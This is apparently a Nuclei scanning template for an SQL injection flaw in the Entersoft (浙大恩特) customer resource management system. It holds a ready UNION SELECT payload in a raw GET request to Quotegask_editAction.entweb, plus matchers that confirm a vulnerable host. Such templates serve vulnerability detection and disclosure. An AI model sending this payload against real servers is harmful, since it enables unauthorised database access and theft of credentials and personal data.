id: entersoft-quotegask-sqli

info:
  name: 浙大恩特客户资源管理系统 Quotegask_editAction.entweb - SQL Injection
  author: qwtd
  severity: high
  description: |
    浙大恩特客户资源管理系统 Quotegask_editAction 接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - https://mp.weixin.qq.com/s/oAX9jaf2YcKKuCmBOyMKdw
    - https://github.com/wy876/POC/blob/main/Cloudlog/Cloudlog%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3delete_oqrs_line%E6%9C%AA%E6%8E%88%E6%9D%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: 浙大恩特客户资源管理系统


http:
  - raw:
      - |
        GET /entsoft/Quotegask_editAction.entweb;.js?goonumStr=1')+UNION+ALL+SELECT+user--+RMMS&method=goonumIsExist HTTP/1.1
        Host: {{Hostname}}
  
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "{\"result\":true,\"data\":\"DBA\"}"

      - type: status
        status:
          - 200